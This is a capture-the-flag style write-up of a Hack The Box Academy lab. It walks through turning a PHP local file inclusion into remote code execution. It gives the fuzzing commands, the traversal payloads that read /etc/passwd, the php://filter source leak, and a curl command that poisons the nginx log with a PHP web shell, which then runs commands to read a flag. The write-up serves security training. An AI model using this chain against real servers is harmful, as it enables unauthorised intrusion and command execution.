# Local File Inclusion (LFI) to Remote Code Execution (RCE) - Skill Assessment Write-Up

**Author**: Jordan Davis  
**Platform**: Hack The Box Academy - LFI Skill Assessment  
**Objective**: Exploit a Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE) and extract a system flag.

---

## 🛠️ Assessment Overview

This write-up documents my approach and successful exploitation of a Local File Inclusion (LFI) vulnerability discovered in a Hack The Box Academy skill assessment lab. The goal was to identify and exploit insecure file inclusion mechanisms to access sensitive files, achieve RCE, and ultimately retrieve a system flag.

---

## 🔍 Initial Recon and Enumeration

### 1. Subdomain Fuzzing

I began by attempting to identify potential virtual hosts using `ffuf`:

```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-u http://94.237.54.192:40972/ -H 'Host: FUZZ.94.237.54.192:40972' -v -c -fs 15829
```

**Result**: No subdomains were discovered.

---

### 2. Directory Enumeration

Next, I scanned for directories using:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
-u http://94.237.54.192:40972/FUZZ -v -c -fs 15829
```

**Findings**:

- `/images/`
- `/css/`
- `/js/`
- `/fonts/`

These appeared to be static directories and not useful for further exploitation.

---

## 🧪 Identifying LFI

Manual browsing revealed a `page` parameter in the URL. I attempted a standard LFI test:

```
http://94.237.54.192:40972/index.php?page=../../../../etc/passwd
```

**Result**: Returned "Invalid input detected". Likely input filtering or extension appending.

I then attempted a PHP wrapper trick to bypass this:

```
http://94.237.54.192:40972/index.php?page=php://filter/read=convert.base64-encode/resource=index
```

**Result**: Source code of `index.php` returned in base64.

**Key discovery**: The application automatically appends `.php` to `page` values.

After decoding the base64, I found:

```php
<?php
  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
?>
```

Accessing the hidden admin panel confirmed this:

```
http://94.237.54.192:40972/ilf_admin/
```

---

## 🧪 Parameter Fuzzing

To look for hidden or undocumented parameters in the admin panel, I ran:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u http://94.237.54.192:47411/ilf_admin/index.php?FUZZ=value -v -c -fs 2035
```

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u http://94.237.54.192:47411/ilf_admin/index.php?log=FUZZ -v -c -fs 2046
```

**Result**: No new parameters discovered.

---

## 🔓 Local File Inclusion via `log` Parameter

Testing the `log` parameter directly with LFI payloads revealed it was vulnerable:

```
http://94.237.54.192:47411/ilf_admin/index.php?log=../../../../etc/passwd
```

**Result**: `/etc/passwd` contents returned.

**Key insight**: No file extension was appended to `log`, unlike `page`.

---

## 💉 Log Poisoning for RCE

### Attempted Payload:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://94.237.54.192:47411/
```

Initially, I expected the injected payload to show in the admin panel log viewer, but it did not update in real time.

I confirmed the server was running **Nginx**, not Apache, and accessed the log file directly:

```
http://94.237.54.192:47411/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log
```

**Result**: The log entry with my PHP payload appeared.

### RCE Trigger:

```
?log=../../../../../../../var/log/nginx/access.log&cmd=id
```

**Output**:

```
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
```

✅ **Remote Code Execution achieved**.

---

## 🎯 Flag Extraction

### Step 1: Listing Root Directory

```
?log=../../../../../../../var/log/nginx/access.log&cmd=ls%20../../../../../
```

**Output**: `flag_dacc60f2348d.txt`

### Step 2: Reading the Flag

```
?log=../../../../../../../var/log/nginx/access.log&cmd=cat ../../../../../flag_dacc60f2348d.txt
```

✅ **Flag retrieved successfully**.

---

## 🔁 Reflections & Lessons Learned

1. **Incorrect Assumption**: Initially assumed the server was running Apache. I should have confirmed this earlier by checking headers or file paths.
2. **Misunderstood Logging Behavior**: I relied on the admin panel’s log viewer and didn't immediately verify the actual log files via LFI after my poisoning attempt.

Correcting these assumptions led to successful exploitation.

---

## ✅ Summary

| Stage              | Result                      |
| ------------------ | --------------------------- |
| Subdomain Scan     | No subdomains found         |
| Directory Scan     | Static folders found        |
| LFI via `page`     | Blocked / filtered          |
| `php://filter`     | Revealed source code        |
| Hidden Admin Panel | Discovered                  |
| Parameter Fuzzing  | No new params               |
| LFI via `log`      | Successful                  |
| Log Poisoning      | Successful                  |
| RCE                | Confirmed via `system(cmd)` |
| Flag               | Extracted via `cat`         |

---

**Status**: ✅ Assessment Completed Successfully

**Jordan Davis**
